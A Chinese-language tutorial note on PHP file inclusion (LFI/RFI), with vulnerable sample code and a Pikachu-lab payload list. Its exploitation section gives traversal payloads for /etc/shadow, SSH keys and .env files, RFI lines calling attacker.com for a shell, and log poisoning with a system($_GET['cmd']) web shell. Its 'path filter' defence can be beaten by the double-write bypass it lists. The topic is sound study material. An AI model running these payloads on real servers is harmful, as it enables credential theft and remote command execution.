### 一、漏洞定义

**文件包含漏洞** 是指 Web 应用在调用 `include()`、`require()` 等函数加载文件时，**用户输入可控制文件路径**，且未经过滤，导致攻击者可以读取或执行任意文件。

---

### 二、漏洞类型

|类型|英文|说明|
|---|---|---|
|**本地文件包含**|LFI（Local File Inclusion）|读取服务器本地文件|
|**远程文件包含**|RFI（Remote File Inclusion）|包含远程服务器上的恶意文件（需 `allow_url_include=On`）|
|**文件读取**|File Disclosure|仅读取文件内容，不执行（如 `file_get_contents()`）|

---

### 三、危险函数

|函数|说明|
|---|---|
|`include()`|包含文件，失败时产生警告，脚本继续执行|
|`include_once()`|同上，但只包含一次|
|`require()`|包含文件，失败时产生致命错误，脚本停止|
|`require_once()`|同上，但只包含一次|
|`file_get_contents()`|读取文件内容并返回字符串|
|`fopen()` / `fread()`|打开并读取文件|
|`readfile()`|读取文件并直接输出|

---

### 四、典型漏洞代码

```php
// LFI 漏洞示例
$file = $_GET['file'];
include("pages/" . $file);
```

```php
// RFI 漏洞示例（需 allow_url_include=On）
$file = $_GET['file'];
include($file);
```

---

### 五、利用方式

#### 5.1 本地文件包含（LFI）

```bash
# 读取敏感文件
?file=../../../../etc/passwd
?file=../../../../Windows/win.ini
?file=../../../../config.php
?file=../../../../.env

# Windows 路径（注意方向）
?file=..\..\..\..\Windows\win.ini
?file=..\..\..\..\Windows\System32\drivers\etc\hosts
```


#### 5.2 读取源码（php://filter）

```bash

# 读取 PHP 源码（Base64 编码）
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=../config.php
# 解码
echo "Base64字符串" | base64 -d
```

#### 5.3 远程文件包含（RFI）

```bash
# 包含远程恶意文件
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.php
# 包含 SMB 共享文件（Windows）
?file=\\attacker.com\share\shell.php
```

#### 5.4 日志包含拿 Shell

```bash

# 1. 先确认日志路径
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/nginx/access.log
?file=../../../../logs/access.log
# 2. 在 User-Agent 中注入 PHP 代码
User-Agent: <?php system($_GET['cmd']); ?>
# 3. 包含日志执行命令
?file=../../../../var/log/apache2/access.log&cmd=whoami
```

#### 5.5 伪协议利用

|协议|用途|
|---|---|
|`php://filter`|读取源码（Base64 编码）|
|`php://input`|执行 POST 数据中的 PHP 代码|
|`data://text/plain`|执行 Base64 编码的代码|
|`zip://`|读取压缩包中的文件|
|`phar://`|读取 PHAR 文件|
|`expect://`|执行系统命令（需安装 expect 扩展）|

```bash

# php://input 执行代码（POST 请求）
POST /index.php?file=php://input
HTTP/1.1
Content-Type: application/x-www-form-urlencoded
<?php system('whoami'); ?>
# data:// 执行代码
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
# 解码后：<?php system('whoami'); ?>
# zip:// 读取压缩包中的文件
?file=zip:///var/www/html/upload/shell.zip%23shell.php
```

#### 5.6 包含上传的文件

```bash

# 1. 上传图片马（含 PHP 代码的图片）
# 2. 包含上传的文件
?file=../../uploads/shell.jpg
?file=../../uploads/avatar.jpg
```

---

### 六、绕过技巧

|绕过方式|示例|
|---|---|
|**路径截断**|`?file=../../etc/passwd%00`（PHP < 5.3.4）|
|**双写绕过**|`?file=....//....//....//etc/passwd`|
|**编码绕过**|`?file=%2e%2e%2f%2e%2e%2fetc/passwd`|
|**大小写绕过**|`?file=..\..\..\Windows\win.ini`（Windows）|
|**长路径截断**|`?file=../../etc/passwd/././././././`|
|**绝对路径**|`?file=/etc/passwd`（如果支持）|
|**空字节截断**|`?file=../../etc/passwd%00`（PHP 5.3.4 以下）|

---

### 七、常见敏感文件路径

#### Linux 系统

|文件路径|内容|
|---|---|
|`/etc/passwd`|系统用户信息|
|`/etc/shadow`|用户密码哈希|
|`/etc/hosts`|主机名解析|
|`/etc/sudoers`|sudo 权限配置|
|`/etc/nginx/nginx.conf`|Nginx 配置|
|`/etc/apache2/apache2.conf`|Apache 配置|
|`/var/www/html/config.php`|Web 配置（数据库密码）|
|`/var/www/html/.env`|环境变量（含密钥）|
|`/root/.bash_history`|root 命令历史|
|`/root/.ssh/id_rsa`|root SSH 私钥|
|`/var/log/apache2/access.log`|Web 访问日志|
|`/var/log/auth.log`|认证日志|
|`/proc/self/environ`|当前进程环境变量|
|`/tmp/`|临时目录（可能有敏感文件）|

#### Windows 系统

|文件路径|内容|
|---|---|
|`C:\Windows\win.ini`|系统配置（验证漏洞存在）|
|`C:\Windows\php.ini`|PHP 配置|
|`C:\Windows\System32\drivers\etc\hosts`|主机解析|
|`C:\inetpub\wwwroot\web.config`|IIS Web 配置|
|`C:\xampp\htdocs\config.php`|XAMPP 配置|
|`C:\phpstudy\WWW\config.php`|PHPStudy 配置|

---

### 八、Pikachu 靶场通关 Payload

```bash

# 读取系统文件
filename=../../../../Windows/win.ini
filename=../../../../Windows/System32/drivers/etc/hosts
# 读取源码
filename=php://filter/convert.base64-encode/resource=fi_local.php
filename=php://filter/convert.base64-encode/resource=../index.php
# 读取其他目录
filename=../../../config.php
filename=../../../../flag.txt
# 包含日志
filename=../../../../var/log/apache2/access.log

```
---

### 九、防御方案

|防御方式|说明|
|---|---|
|**路径白名单**|只允许包含指定目录下的文件|
|**过滤危险字符**|过滤 `../`、`..\`、`./`、`:` 等|
|**禁用远程包含**|设置 `allow_url_include = Off`|
|**使用绝对路径**|使用 `realpath()` 验证路径|
|**限制文件类型**|只允许包含 `.php`、`.html` 等|
|**Web 应用防火墙**|使用 WAF 拦截恶意请求|
|**最小权限**|Web 进程不以 root/Administrator 运行|

#### 安全代码示例

```bash

// 白名单方式
$allowed = ['home', 'about', 'contact'];
$file = $_GET['file'];
if (in_array($file, $allowed)) {
    include("pages/" . $file . ".php");
} else {
    die("Invalid file");
}
// 路径过滤方式
$file = str_replace(array('../', '..\\', './', '\\'), '', $_GET['file']);
include("pages/" . $file);
```

---

### 十、一句话总结

> **文件包含漏洞的本质是用户输入控制了文件路径。利用方向有：读取敏感文件（LFI）、包含远程恶意文件（RFI）、读取源码（php://filter）、日志包含拿 Shell。防御核心是白名单 + 输入过滤 + 禁用远程包含。**